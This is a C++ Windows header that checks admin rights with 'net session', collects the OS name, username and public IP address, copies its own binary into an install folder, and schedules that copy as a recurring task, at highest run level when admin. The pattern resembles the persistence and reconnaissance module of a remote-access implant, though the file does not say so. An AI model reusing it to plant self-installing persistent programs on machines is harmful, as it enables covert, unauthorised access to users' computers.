#ifndef WIN_COMPONENTS_HH
#define WIN_COMPONENTS_HH

#include <string>
#include <fstream>
#include <regex>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include "constants.hh"
#include "win-request.hh"

bool IS_SUPERUSER;
bool IS_SUPERUSER_IS_CACHED = false;

static void copyFile (std::string src, std::string dst) {
    std::ifstream srcFile (src, std::ios::binary);
    std::ofstream dstFile (dst, std::ios::binary|std::ios::trunc);
    if (srcFile.is_open() && dstFile.is_open()) dstFile << srcFile.rdbuf();
}

namespace util {

std::string getCmdOutput(const std::string& cmd) {
    FILE *pipe;
    char buf[512];
    std::string output;

    if ( !(pipe = _popen(cmd.c_str(), "r")) ) {
        std::exit(1);
    }

    while (fgets(buf, sizeof(buf), pipe) != NULL) {
        output += buf;
    }
    _pclose(pipe);

    return output;
}

bool isSuperuser() {
	if (IS_SUPERUSER_IS_CACHED) {
		return IS_SUPERUSER;
	} else {
		IS_SUPERUSER = (util::getCmdOutput("net session")).size();
		IS_SUPERUSER_IS_CACHED = true;

		return IS_SUPERUSER;
	}
}

std::string getInstallDir() {
	std::string installDir;
	if (util::isSuperuser()) {
		installDir = ADMIN_INSTALL_DIR + "\\";
	} else {
		installDir = std::getenv("USERPROFILE") + ("\\" + INSTALL_DIR + "\\");
	}

	return installDir;
}

std::string getOS() {
	std::string winVersion = util::getCmdOutput("systeminfo | findstr /B /C:\"OS Name\"");
	std::regex pattern("[\\n\\r\\s]*.*?(Windows\\s*\\S+).*[\\n\\r\\s]*");
	std::smatch match;
	std::regex_match(winVersion, match, pattern);

	return match[1];
}

std::string getUser() {
    std::string user = std::getenv("USERNAME");
    if (isSuperuser()) {
        user += " (admin)";
    }

    return user;
}

std::string getIPAddr() {
    return request::get(GET_IP_URL);
}

} // namespace util

namespace install {

void installFiles() {
	std::string installDir = util::getInstallDir();
    std::system(("mkdir " + installDir).c_str());
	copyFile(BIN, installDir + BIN_NEW);
}

void initRecurringJob() {
    // Schedule task for Windows
	std::string installDir = util::getInstallDir();
	std::string taskCommand =
		"schtasks.exe /create /F /tn " + TASK_NAME
		+ " /sc " + TASK_FREQ
		+ " /mo " + TASK_FREQ_VALUE
		+ " /tr " + installDir + BIN_NEW;
	if (util::isSuperuser()) {
		taskCommand += " /rl highest";
	}

    std::system(taskCommand.c_str());
}

} //namespace install

#endif // WIN_COMPONENTS_HH
